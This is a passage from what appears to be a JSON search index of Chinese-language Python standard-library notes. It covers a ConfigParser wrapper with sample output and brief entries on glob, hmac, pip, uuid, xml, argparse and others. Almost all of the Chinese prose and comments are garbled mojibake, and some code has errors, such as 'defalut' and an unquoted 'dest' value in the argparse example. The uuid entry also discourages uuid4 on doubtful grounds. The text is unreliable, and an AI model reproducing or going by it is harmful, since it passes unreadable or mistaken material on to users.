__init__ ( self , config_path : str ): self . _config_path = config_path self . _read_file () @property def config_parser ( self ): return self . _config_parser @property def selections ( self ): return self . _config_parser . sections () def has_selection ( self , name : str ): return self . _config_parser . has_section ( name ) def has_option ( self , selection : str , option : str ): return self . _config_parser . has_option ( selection , option ) def add_selection ( self , name : str ): if not self . has_selection ( name ): self . _config_parser . add_section ( name ) def add_options ( self , selection : str , data : Dict [ str , str ]): if self . has_selection ( selection ): for k , v in data . items (): self . _config_parser . set ( selection , k , v ) def remove_selection ( self , name : str ): self . _config_parser . remove_section ( name ) def remove_option ( self , selection : str , data : List [ str ]): if self . has_selection ( selection ): for option in data : self . _config_parser . remove_option ( selection , option ) def main (): my_config = MyConfig ( config_path = './setting.ini' ) # è·å–æ‰€æœ‰çš„èŠ‚ print ( 'è·å–æ‰€æœ‰çš„èŠ‚' , my_config . selections ) # åˆ¤æ–­æ˜¯å¦å­˜åœ¨ dev èŠ‚ print ( 'åˆ¤æ–­æ˜¯å¦å­˜åœ¨ dev èŠ‚' , my_config . has_selection ( 'dev' )) # åˆ¤æ–­æ˜¯å¦å­˜åœ¨ tt èŠ‚ print ( 'åˆ¤æ–­æ˜¯å¦å­˜åœ¨ tt èŠ‚' , my_config . has_selection ( 'tt' )) # åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ a é€‰é¡¹ print ( 'åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ a é€‰é¡¹' , my_config . has_option ( 'dev' , 'a' )) # åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ aa é€‰é¡¹ print ( 'åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ aa é€‰é¡¹' , my_config . has_option ( 'dev' , 'aa' )) # æ·»åŠ ä¸€ä¸ª tt èŠ‚ print ( 'æ·»åŠ ä¸€ä¸ª tt èŠ‚' , my_config . add_selection ( 'tt' ), my_config . selections ) # ttèŠ‚æ·»åŠ é€‰é¡¹ my_config . add_options ( 'tt' , { 'a' : '123' , 'b' : '123' , 'c' : '123' , }) # è¯»å–ä¸€ä¸ªèŠ‚ print ( 'è¯»å– dev èŠ‚æ‰€æœ‰é€‰é¡¹' , my_config . config_parser . options ( 'dev' )) # è¯»å–ä¸€ä¸ªèŠ‚çš„æŸä¸ªé€‰é¡¹ print ( 'è¯»å– dev èŠ‚ a é€‰é¡¹' , my_config . config_parser . get ( 'dev' , 'a' )) print ( 'è¯»å– dev èŠ‚ a é€‰é¡¹' , my_config . config_parser . getint ( 'dev' , 'a' )) # è¯»å–ä¸€ä¸ªèŠ‚æ‰€æœ‰é…ç½® print ( 'è¯»å– dev èŠ‚æ‰€æœ‰é…ç½®' , my_config . config_parser . items ( 'dev' )) # æ”¯æŒç›´æ¥ä»¥å­—å…¸çš„å½¢å¼å†™å…¥ my_config . config_parser [ 'DEFAULT' ] = { 'ServerAliveInterval' : '45' , 'Compression' : 'yes' , 'CompressionLevel' : '9' } # ä¿å­˜, åªæœ‰ä¿å­˜æ‰ä¼šæŒä¹…åŒ–å†™å…¥åˆ°ç¡¬ç›˜ my_config . save () è·å–æ‰€æœ‰çš„èŠ‚ ['default', 'dev', 'test', 'tt'] åˆ¤æ–­æ˜¯å¦å­˜åœ¨ dev èŠ‚ True åˆ¤æ–­æ˜¯å¦å­˜åœ¨ tt èŠ‚ True åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ a é€‰é¡¹ True åˆ¤æ–­ dev èŠ‚æ˜¯å¦å­˜åœ¨ aa é€‰é¡¹ False æ·»åŠ ä¸€ä¸ª tt èŠ‚ None ['default', 'dev', 'test', 'tt'] è¯»å– dev èŠ‚æ‰€æœ‰é€‰é¡¹ ['a', 'b', 'c'] è¯»å– dev èŠ‚ a é€‰é¡¹ 11 è¯»å– dev èŠ‚ a é€‰é¡¹ 11 è¯»å– dev èŠ‚æ‰€æœ‰é…ç½® [('a', '11'), ('b', '22'), ('c', '33')] [DEFAULT] serveraliveinterval = 45 compression = yes compressionlevel = 9 [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 [tt] a = 123 b = 123 c = 123","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-ConfigParser.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-ConfigParser.html"},{"title":"glob","text":"glob --- Unix é£æ ¼è·¯å¾„åæ¨¡å¼æ‰©å±• å®˜ç½‘: https://docs.python.org/zh-cn/3/library/glob.html glob æ¨¡å—ä¼šæŒ‰ç…§ Unix shell æ‰€ä½¿ç”¨çš„è§„åˆ™æ‰¾å‡ºæ‰€æœ‰åŒ¹é…ç‰¹å®šæ¨¡å¼çš„è·¯å¾„åç§°ï¼Œä½†è¿”å›ç»“æœçš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚ æ³¢æµªå·æ‰©å±•ä¸ä¼šç”Ÿæ•ˆï¼Œä½†*, ? ä»¥åŠç”¨ [] è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´å°†è¢«æ­£ç¡®åœ°åŒ¹é…ã€‚ è¿™æ˜¯é€šè¿‡é…åˆä½¿ç”¨ os.scandir() å’Œ fnmatch.fnmatch() å‡½æ•°æ¥å®ç°çš„ï¼Œè€Œä¸æ˜¯é€šè¿‡å®é™…å‘èµ·è°ƒç”¨å­ shellã€‚ 3.4 æ–°ç‰ˆåŠŸèƒ½.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Glob.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Glob.html"},{"title":"hmac","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/hmac.html åŸºäºå¯†é’¥çš„æ¶ˆæ¯éªŒè¯ æ­¤æ¨¡å—å®ç°äº† HMAC ç®—æ³•ï¼Œç®—æ³•çš„æè¿°å‚è§ RFC 2104ã€‚ å¸¸ç”¨ä¸¤ä¸ªAPI","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-HMAC.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-HMAC.html"},{"title":"pip","text":"ä¸€ä¸ªä¸‰æ–¹åŒ…ç®¡ç†å™¨. åœ¨Ubuntuè¿™ç§ç³»ç»Ÿä¸Š, å¯èƒ½æ²¡æœ‰é¢„è£…éœ€è¦æ‰‹åŠ¨å®‰è£…: apt install python3-pip -y æŸ¥çœ‹è·å–é…ç½®æ–‡ä»¶çš„ä½ç½®: pip -v config list","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-PIP.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-PIP.html"},{"title":"secrets","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Secrets.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Secrets.html"},{"title":"textwrap","text":"å®˜ç½‘: textwrap --- æ–‡æœ¬è‡ªåŠ¨æ¢è¡Œä¸å¡«å…… textwrap æ¨¡å—æä¾›äº†ä¸€äº›å¿«æ·å‡½æ•°ï¼Œä»¥åŠå¯ä»¥å®Œæˆæ‰€æœ‰å·¥ä½œçš„ç±» TextWrapperã€‚ å¦‚æœä½ åªæ˜¯è¦å¯¹ä¸€ä¸¤ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²è¿›è¡Œè‡ªåŠ¨æ¢è¡Œæˆ–å¡«å……ï¼Œå¿«æ·å‡½æ•°åº”è¯¥å°±å¤Ÿç”¨äº†ï¼›å¦åˆ™ï¼Œåº”è¯¥ä½¿ç”¨ TextWrapper çš„å®ä¾‹æ¥æé«˜æ•ˆç‡ã€‚ å¿«æ·å‡½æ•° wrap fill shorten dedent wrap fill shorten dedent indent wrap(), fill() å’Œ shorten() çš„ä½œç”¨æ–¹å¼ä¸ºåˆ›å»ºä¸€ä¸ª TextWrapper å®ä¾‹å¹¶åœ¨å…¶ä¸Šè°ƒç”¨å•ä¸ªæ–¹æ³•ã€‚ è¯¥å®ä¾‹ä¸ä¼šè¢«é‡ç”¨ï¼Œå› æ­¤å¯¹äºè¦ä½¿ç”¨ wrap() å’Œ/æˆ– fill() æ¥å¤„ç†è®¸å¤šæ–‡æœ¬å­—ç¬¦ä¸²çš„åº”ç”¨æ¥è¯´ï¼Œ åˆ›å»ºä½ è‡ªå·±çš„ TextWrapper å¯¹è±¡å¯èƒ½ä¼šæ›´æœ‰æ•ˆç‡ã€‚ æ–‡æœ¬æœ€å¥½åœ¨ç©ºç™½ç¬¦ä½ç½®è‡ªåŠ¨æ¢è¡Œï¼ŒåŒ…æ‹¬å¸¦è¿å­—ç¬¦å•è¯çš„è¿å­—ç¬¦ä¹‹åï¼› é•¿å•è¯ä»…åœ¨å¿…è¦æ—¶ä¼šè¢«æ‹†åˆ†ï¼Œé™¤é TextWrapper.break_long_words è¢«è®¾ä¸ºå‡å€¼ã€‚ TextWrapper TextWrapper ç±»","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Textwrap.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Textwrap.html"},{"title":"uuid","text":"å®˜ç½‘æ–‡æ¡£:: uuid RFC 4122 å®šä¹‰çš„UUIDå¯¹è±¡ æä¾›äº†ä¸å¯å˜çš„ UUID å¯¹è±¡ (UUID ç±») ä»¥åŠ: uuid1 , uuid3 , uuid4 , uuid5 ç­‰å‡½æ•°ç”¨äºç”Ÿæˆ RFC 4122 æ‰€å®šä¹‰çš„ç¬¬ 1, 3, 4 å’Œ 5 ç‰ˆ UUID. ä½¿ç”¨æ–¹é¢: Pythonä¸­æ²¡æœ‰åŸºäºDCEçš„ï¼Œæ‰€ä»¥uuid2å¯ä»¥å¿½ç•¥ï¼› uuid4å­˜åœ¨æ¦‚ç‡æ€§é‡å¤ï¼Œç”±æ— æ˜ å°„æ€§ï¼Œæœ€å¥½ä¸ç”¨ï¼› è‹¥åœ¨Globalçš„åˆ†å¸ƒå¼è®¡ç®—ç¯å¢ƒä¸‹ï¼Œæœ€å¥½ç”¨uuid1ï¼› è‹¥æœ‰åå­—çš„å”¯ä¸€æ€§è¦æ±‚ï¼Œæœ€å¥½ç”¨uuid3æˆ–uuid5ã€‚ ä¸»è¦çš„ç±» SafeUUID å…·æœ‰çš„åªè¯»å±æ€§ UUID.bytes UUIDæ˜¯ä¸€ä¸ª16å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆåŒ…å«6ä¸ªå¤§ç«¯å­—èŠ‚åºçš„æ•´æ•°å­—æ®µï¼‰. UUID.bytes_le UUID æ˜¯ä¸€ä¸ª 16 å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆå…¶ä¸­ time_lowã€time_mid å’Œ time_hi_version ä¸ºå°ç«¯å­—èŠ‚é¡ºåºï¼‰. UUID.fields ä»¥å…ƒç»„å½¢å¼å­˜æ”¾çš„UUIDçš„6ä¸ªæ•´æ•°åŸŸï¼Œæœ‰å…­ä¸ªå•ç‹¬çš„å±æ€§å’Œä¸¤ä¸ªæ´¾ç”Ÿå±æ€§ï¼š åŸŸ å«æ„ time_low UUIDçš„å‰32ä½ time_mid æ¥å‰ä¸€åŸŸçš„16ä½ time_hi_version æ¥å‰ä¸€åŸŸçš„16ä½ clock_seq_hi_variant æ¥å‰ä¸€åŸŸçš„8ä½ clock_seq_low æ¥å‰ä¸€åŸŸçš„8ä½ node UUIDçš„æœ€å48ä½ time UUIDçš„æ€»é•¿60ä½çš„æ—¶é—´æˆ³ clock_seq 14ä½çš„åºåˆ—å· UUID.hex UUID æ˜¯ä¸€ä¸ª 32 å­—ç¬¦çš„å°å†™åå…­è¿›åˆ¶æ•°ç å­—ç¬¦ä¸². ä¸ç›´æ¥ str è½¬æ¢çš„æ•ˆæœç±»ä¼¼: a = uuid.uuid4() a Out[10]: UUID('a7de0199-3e5e-4d84-8fd3-5f65052db9b5') # convert a UUID to a string of hex digits in standard form str(a) Out[11]: 'a7de0199-3e5e-4d84-8fd3-5f65052db9b5' a.hex Out[12]: 'a7de01993e5e4d848fd35f65052db9b5' UUID.int UUIDæ˜¯ä¸€ä¸ª128ä½çš„æ•´æ•°. UUID.urn åœ¨ RFC 4122 ä¸­å®šä¹‰çš„ URN å½¢å¼çš„ UUID. UUID.variant UUID çš„å˜ä½“ï¼Œå®ƒå†³å®šäº† UUID çš„å†…éƒ¨å¸ƒå±€. è¿™å°†æ˜¯ RESERVED_NCS , RFC_4122 , RESERVED_MICROSOFT æˆ– RESERVED_FUTURE ä¸­çš„ä¸€ä¸ª. UUID.version UUID ç‰ˆæœ¬å·ï¼ˆ1 åˆ° 5ï¼Œåªæœ‰å½“å˜ä½“ä¸º RFC_4122 æ—¶æ‰æœ‰æ„ä¹‰ï¼‰. UUID.is_safe ä¸€ä¸ª SafeUUID çš„æšä¸¾ï¼Œè¡¨ç¤ºå¹³å°æ˜¯å¦ä»¥å¤šè¿›ç¨‹å®‰å…¨çš„æ–¹å¼ç”Ÿæˆ UUID. æ¨¡å—å‡½æ•° uuid.getnode() è·å– 48 ä½æ­£æ•´æ•°å½¢å¼çš„ç¡¬ä»¶åœ°å€. ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œå®ƒå¯èƒ½ä¼šå¯åŠ¨ä¸€ä¸ªå•ç‹¬çš„ç¨‹åºï¼Œè¿™å¯èƒ½ä¼šç›¸å½“æ…¢. å¦‚æœæ‰€æœ‰è·å–ç¡¬ä»¶åœ°å€çš„å°è¯•éƒ½å¤±è´¥äº†ï¼Œæˆ‘ä»¬ä¼šæŒ‰ç…§ RFC 4122 ä¸­çš„å»ºè®®ï¼Œé€‰æ‹©ä¸€ä¸ªéšæœºçš„ 48 ä½æ•°å­—ï¼Œ å…¶å¤šæ’­ä½ (ç¬¬ä¸€ä¸ªå…«è¿›åˆ¶æ•°çš„æœ€å°æœ‰æ•ˆä½) è®¾ç½®ä¸º 1. \"ç¡¬ä»¶åœ°å€\"æ˜¯æŒ‡ä¸€ä¸ªç½‘ç»œæ¥å£çš„ MAC åœ°å€. åœ¨ä¸€å°æœ‰å¤šä¸ªç½‘ç»œæ¥å£çš„æœºå™¨ä¸Šï¼Œ æ™®éç®¡ç†çš„ MAC åœ°å€ (å³ç¬¬ä¸€ä¸ªå…«ä½æ•°çš„ç¬¬äºŒä¸ªæœ€å°æœ‰æ•ˆä½æ˜¯ æœªè®¾ç½®çš„) å°†æ¯”æœ¬åœ°ç®¡ç†çš„ MAC åœ°å€ä¼˜å…ˆï¼Œä½†æ²¡æœ‰å…¶ä»–æ’åºä¿è¯. åœ¨ 3.7 ç‰ˆæ›´æ”¹: æ™®éç®¡ç†çš„MACåœ°å€ä¼˜äºæœ¬åœ°ç®¡ç†çš„MACåœ°å€ï¼Œå› ä¸ºå‰è€…ä¿è¯æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œè€Œåè€…åˆ™ä¸æ˜¯. uuid.uuid1(node=None, clock_seq=None) åŸºäºæ—¶é—´æˆ³ æ ¹æ®ä¸»æœº IDã€åºåˆ—å·å’Œå½“å‰æ—¶é—´ç”Ÿæˆä¸€ä¸ª UUID. å¦‚æœæ²¡æœ‰ç»™å‡º nodeï¼Œåˆ™ä½¿ç”¨ getnode() æ¥è·å–ç¡¬ä»¶åœ°å€(MACåœ°å€), è™½ç„¶ä¿è¯äº†å…¨çƒçš„å”¯ä¸€, ä½†ä¼šæœ‰å®‰å…¨é—®é¢˜(MACåœ°å€å”¯ä¸€). æ‰€ä»¥å±€åŸŸç½‘ä¸­ node å¯ä»¥ä½¿ç”¨ ip åœ°å€. å¦‚æœç»™å‡ºäº† clock_seqï¼Œå®ƒå°†è¢«ç”¨ä½œåºåˆ—å·ï¼›å¦åˆ™å°†é€‰æ‹©ä¸€ä¸ªéšæœºçš„ 14 æ¯”ç‰¹ä½åºåˆ—å·. uuid.uuid3(namespace, name) åŸºäºåå­—çš„MD5æ•£åˆ—å€¼ æ ¹æ®å‘½åç©ºé—´æ ‡è¯†ç¬¦ï¼ˆè¿™æ˜¯ä¸€ä¸ªUUIDï¼‰å’Œåç§°ï¼ˆè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰çš„MD5å“ˆå¸Œå€¼ï¼Œç”Ÿæˆä¸€ä¸ªUUID. uuid.uuid4() åŸºäºéšæœºæ•° ç”Ÿæˆä¸€ä¸ªéšæœºçš„UUID. ç”±ä¼ªéšæœºæ•°å¾—åˆ°ï¼Œæœ‰ä¸€å®šçš„é‡å¤æ¦‚ç‡ï¼Œè¯¥æ¦‚ç‡å¯ä»¥è®¡ç®—å‡ºæ¥ã€‚ uuid.uuid5(namespace, name) åŸºäºåå­—çš„SHA-1æ•£åˆ—å€¼ ä¸uuid3ç±»ä¼¼, æ ¹æ®å‘½åç©ºé—´æ ‡è¯†ç¬¦ï¼ˆè¿™æ˜¯ä¸€ä¸ªUUIDï¼‰å’Œåç§°ï¼ˆè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰çš„SHA-1å“ˆå¸Œå€¼ç”Ÿæˆä¸€ä¸ªUUID. æ³¨è§£ å…¶å®è¿˜æœ‰ä¸€ä¸ªuuid2, åŸºäºåˆ†å¸ƒå¼è®¡ç®—ç¯å¢ƒDCE, ä¸è¿‡pythonæ²¡æœ‰ ç®—æ³•ä¸uuid1ç›¸åŒï¼Œä¸åŒçš„æ˜¯æŠŠæ—¶é—´æˆ³çš„å‰4ä½ç½®æ¢ä¸ºPOSIXçš„UIDã€‚å®é™…ä¸­å¾ˆå°‘ç”¨åˆ°è¯¥æ–¹æ³•ã€‚ å‘½åç©ºé—´æ ‡è¯†ç¬¦ uuid æ¨¡å—å®šä¹‰äº†ä»¥ä¸‹å‘½åç©ºé—´æ ‡è¯†ç¬¦ï¼Œä¾› uuid3() æˆ– uuid5() ä½¿ç”¨. uuid.NAMESPACE_DNS å½“æŒ‡å®š namespace ä¸ºæ­¤å€¼æ—¶, nameå€¼ä¸ºåŸŸå(domain name) uuid.NAMESPACE_URL å½“æŒ‡å®šè¿™ä¸ªå‘½åç©ºé—´æ—¶ï¼Œname å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ª URL. uuid.NAMESPACE_OID å½“æŒ‡å®šè¿™ä¸ªå‘½åç©ºé—´æ—¶ï¼Œname å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ª ISO OID. uuid.NAMESPACE_X500 å½“æŒ‡å®šè¿™ä¸ªå‘½åç©ºé—´æ—¶ï¼Œname å­—ç¬¦ä¸²æ˜¯ DER æˆ–æ–‡æœ¬è¾“å‡ºæ ¼å¼çš„ X.500 DN. uuid æ¨¡å—ä¸º variant å±æ€§çš„å¯èƒ½å€¼å®šä¹‰äº†ä»¥ä¸‹å¸¸é‡: uuid.RESERVED_NCS ä¸ºNCSå…¼å®¹æ€§ä¿ç•™. uuid.RFC_4122 æŒ‡å®š RFC 4122 ä¸­ç»™å‡ºçš„ UUID å¸ƒå±€. uuid.RESERVED_MICROSOFT ä¸ºå¾®è½¯çš„å…¼å®¹æ€§ä¿ç•™. uuid.RESERVED_FUTURE ä¿ç•™ç»™æœªæ¥çš„å®šä¹‰.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-UUID.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-UUID.html"},{"title":"xml","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/xml.html å¤„ç† XML çš„æ¨¡å—. è­¦å‘Š XML æ¨¡å—å¯¹äºé”™è¯¯æˆ–æ¶æ„æ„é€ çš„æ•°æ®æ˜¯ä¸å®‰å…¨çš„ã€‚ å¦‚æœä½ éœ€è¦è§£æä¸å—ä¿¡ä»»æˆ–æœªç»èº«ä»½éªŒè¯çš„æ•°æ®ï¼Œè¯·ä½¿ç”¨ defusedxml åŒ…: pip install defusedxml XML å¤„ç†å­æ¨¡å—åŒ…æ‹¬: xml.etree.ElementTreeï¼š ElementTree APIï¼Œä¸€ä¸ªç®€å•è€Œè½»é‡çº§çš„XMLå¤„ç†å™¨ xml.domï¼šDOM API å®šä¹‰ xml.dom.minidomï¼šæœ€å°çš„ DOM å®ç° xml.dom.pulldomï¼šæ”¯æŒæ„å»ºéƒ¨åˆ† DOM æ ‘ xml.saxï¼šSAX2 åŸºç±»å’Œä¾¿åˆ©å‡½æ•° xml.parsers.expatï¼šExpatè§£æå™¨ç»‘å®š æš‚æ—¶åªè¯´å¸¸ç”¨çš„ xml.etree.ElementTree xml.etree.ElementTree è¯¦è§: https://docs.python.org/zh-cn/3/library/xml.etree.elementtree.html#module-xml.etree.ElementTree å®ç°äº†ä¸€ä¸ªç®€å•é«˜æ•ˆçš„APIï¼Œç”¨äºè§£æå’Œåˆ›å»ºXMLæ•°æ®ã€‚ é˜»å¡è·å–æ–‡ä»¶æ•°æ®: import xml.etree.ElementTree as ET tree = ET.parse('country_data.xml') root = tree.getroot() å¦‚æœXMLæ•°æ®ç›´æ¥æ˜¯å­—ç¬¦ä¸²: root = ET.fromstring(country_data_as_string) root å…·æœ‰æ ‡ç­¾å’Œå±æ€§å­—å…¸: >>> root.tag 'data' >>> root.attrib {} ElementTreeæ–¹æ³•: find() iterfind() findtext() iterparse() å‘½ä»¤ç©ºé—´çš„è¯´æ˜ åœ¨ XML æ–‡æ¡£ä¸­,xmlns:s å’Œ xmlns éƒ½ç”¨äºå®šä¹‰å‘½åç©ºé—´,ä½†æœ‰ä»¥ä¸‹åŒºåˆ«: xmlns:s å®šä¹‰çš„æ˜¯å‘½åç©ºé—´å‰ç¼€ ,è¯­æ³•æ˜¯: xmlns:s=\"http://www.w3.org/ns/example\" è¿™å®šä¹‰äº†ä¸€ä¸ªåç§°ä¸º \"s\" çš„å‘½åç©ºé—´å‰ç¼€,æŒ‡å‘ \" http://www.w3.org/ns/example \" è¿™ä¸ªå‘½åç©ºé—´ã€‚ ç„¶ååœ¨å…ƒç´ ä¸­,ä½¿ç”¨ \"s:\" å‰ç¼€æ¥æŒ‡ç¤ºè¿™ä¸ªå…ƒç´ å±äºè¿™ä¸ªå‘½åç©ºé—´: <s:name>John</s:name> xmlns å®šä¹‰çš„æ˜¯é»˜è®¤å‘½åç©ºé—´ ,è¯­æ³•æ˜¯: xmlns=\"http://www.w3.org/ns/example\" è¿™å®šä¹‰äº†é»˜è®¤å‘½åç©ºé—´ä¸º \" http://www.w3.org/ns/example \"ã€‚ ç„¶åè¯¥é»˜è®¤å‘½åç©ºé—´ä½œç”¨åŸŸå†…çš„æ‰€æœ‰å…ƒç´ éƒ½å±äºè¿™ä¸ªå‘½åç©ºé—´,æ— é¡»ä½¿ç”¨å‰ç¼€: <name>John</name> å½“ XML æ–‡æ¡£ä¸­åªå®šä¹‰ä¸€ä¸ªå‘½åç©ºé—´æ—¶,é€šå¸¸ä½¿ç”¨é»˜è®¤å‘½åç©ºé—´ã€‚å½“å®šä¹‰å¤šä¸ªå‘½åç©ºé—´,åˆæƒ³åŒºåˆ†å…ƒç´ å±äºå“ªä¸ªå‘½åç©ºé—´æ—¶,æ‰éœ€è¦ä½¿ç”¨å‘½åç©ºé—´å‰ç¼€. å¦‚æœä¸€ä¸ªå…ƒç´ æ—¢å®šä¹‰äº†é»˜è®¤å‘½åç©ºé—´,åˆå®šä¹‰äº†å‘½åç©ºé—´å‰ç¼€,æ­¤æ—¶: æ— å‰ç¼€çš„å…ƒç´ å±äºé»˜è®¤å‘½åç©ºé—´ ä½¿ç”¨å‰ç¼€çš„å…ƒç´ å±äºç›¸åº”çš„å‘½åç©ºé—´ å‘½åç©ºé—´çš„å¤„ç† è‹¥ä½¿ç”¨æ˜ å°„å­—å…¸: namespaces = { 's': 'http://schemas.xmlsoap.org/soap/envelope/', 'u': 'urn:schemas-upnp-org:service:ContentDirectory:1' } body = envelope.find('Body', namespaces) è¿™é‡Œ,æˆ‘ä»¬ä¼ å…¥äº†ä¸€ä¸ªå­—å…¸,å°†å‰ç¼€`s`æ˜ å°„åˆ°SOAP envelopeå‘½åç©ºé—´,å‰ç¼€`u`æ˜ å°„åˆ°UPnP ContentDirectoryæœåŠ¡çš„å‘½åç©ºé—´ã€‚ è¿™æ ·,åœ¨æŸ¥æ‰¾å…ƒç´ æ—¶,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‰ç¼€æ¥é™å®šå‘½åç©ºé—´,ä¾‹å¦‚: browse = body.find('{urn:schemas-upnp-org:service:ContentDirectory:1}Browse') ç­‰åŒäº: browse = body.find('u:Browse', namespaces)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-XML.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-XML.html"},{"title":"argparse","text":"åŸºæœ¬ä½¿ç”¨æ¨¡æ¿: # å¯¼å…¥argparse import argparse parser = argparse.ArgumentParser(description=\"Demo of argparse\") # ç”Ÿæˆargparseå¯¹è±¡ parser.add_argument('-n','--name', default=' Li ') # å¢åŠ å‚æ•° args = parser.parse_args() # è·å– add_argumentå‚æ•°åˆ—è¡¨: default # add_argument required # è¿™ä¸ªå‚æ•°æ˜¯å¦ä¸€å®šéœ€è¦è®¾ç½® type # å‚æ•°ç±»å‹ choices # å‚æ•°å€¼åªèƒ½ä»å‡ ä¸ªé€‰é¡¹é‡Œé¢é€‰æ‹© help # æŒ‡å®šå‚æ•°çš„è¯´æ˜ä¿¡æ¯ dest # è®¾ç½®å‚æ•°åœ¨ä»£ç ä¸­çš„å˜é‡å nargs # è®¾ç½®å‚æ•°åœ¨ä½¿ç”¨å¯ä»¥æä¾›çš„ä¸ªæ•° # å€¼ å«ä¹‰ N # å‚æ•°çš„ç»å¯¹ä¸ªæ•°ï¼ˆä¾‹å¦‚ï¼š3ï¼‰ '?' # 0æˆ–1ä¸ªå‚æ•° '*' # 0æˆ–æ‰€æœ‰å‚æ•° '+' # æ‰€æœ‰ï¼Œå¹¶ä¸”è‡³å°‘ä¸€ä¸ªå‚æ•° ä¾‹: parser.add_argument('-n', defalut=1, required=True, type=int, choices=[1,2,3], help='is number', dest=iNum, nargs='?') ä¾‹å­: import argparse def main(): parser = argparse.ArgumentParser(description=\"Demo of argparse\") parser.add_argument('-n','--name', default=' Li ') parser.add_argument('-y','--year', default='20') args = parser.parse_args() print(args) name = args.name year = args.year print('Hello {} {}'.format(name,year)) if __name__ == '__main__': main()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-argparse.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-argparse.html"},{"title":"atexit","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/atexit.html é€€å‡ºå¤„ç†å™¨, æ›´æ­£ç¡®ä¸€ç‚¹æ¥è¯´, æ˜¯ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶å€™çš„é€€å‡ºå¤„ç†å™¨. atexit æ¨¡å—å®šä¹‰äº†æ¸…ç†å‡½æ•°çš„æ³¨å†Œå’Œåæ³¨å†Œå‡½æ•°. è¢«æ³¨å†Œçš„å‡½æ•°ä¼šåœ¨è§£é‡Šå™¨æ­£å¸¸ç»ˆæ­¢æ—¶æ‰§è¡Œ. atexit ä¼šæŒ‰ç…§æ³¨å†Œé¡ºåºçš„*é€†åº*æ‰§è¡Œ; å¦‚æœä½ æ³¨å†Œäº† A, B å’Œ C, é‚£ä¹ˆåœ¨è§£é‡Šå™¨ç»ˆæ­¢æ—¶ä¼šä¾åºæ‰§è¡Œ C, B, A. æ³¨è§£ é€šè¿‡è¯¥æ¨¡å—æ³¨å†Œçš„å‡½æ•°, åœ¨ç¨‹åºè¢«æœªè¢« Python æ•è·çš„ä¿¡å·æ€æ­»æ—¶å¹¶ä¸ä¼šæ‰§è¡Œ, åœ¨æ£€æµ‹åˆ° Python å†…éƒ¨è‡´å‘½é”™è¯¯ä»¥åŠè°ƒç”¨äº† os._exit() æ—¶ä¹Ÿä¸ä¼šæ‰§è¡Œ. æä¾›çš„ä¸¤ä¸ªapi","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-atexit.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-atexit.html"},{"title":"cmath","text":"å¤æ•°è®¡ç®—æ”¯æŒ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-cmath.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-cmath.html"},{"title":"contextlib","text":"contextlib --- ä¸º withè¯­å¥ä¸Šä¸‹æ–‡æä¾›çš„å·¥å…· å®˜ç½‘: https://docs.python.org/zh-cn/3/library/contextlib.html æ­¤æ¨¡å—ä¸ºæ¶‰åŠ with è¯­å¥çš„å¸¸è§ä»»åŠ¡æä¾›äº†å®ç”¨çš„å·¥å…·ã€‚ å¸¸ç”¨çš„ä¸¤ä¸ªè£…é¥°å™¨: @contextlib.contextmanager @contextlib.asynccontextmanager","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextLib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextLib.html"},{"title":"contextvars","text":"å®˜ç½‘æ–‡æ¡£: https://docs.python.org/zh-cn/3/library/contextvars.html ä¸Šä¸‹æ–‡å˜é‡ æœ¬æ¨¡å—æä¾›äº†ç›¸å…³APIç”¨äºç®¡ç†ã€å­˜å‚¨å’Œè®¿é—®ä¸Šä¸‹æ–‡ç›¸å…³çš„çŠ¶æ€ã€‚ ContextVar ç±»ç”¨äºå£°æ˜ ä¸Šä¸‹æ–‡å˜é‡ å¹¶ä¸å…¶ä¸€èµ·ä½¿ç”¨ã€‚ å‡½æ•° copy_context() å’Œç±» Context 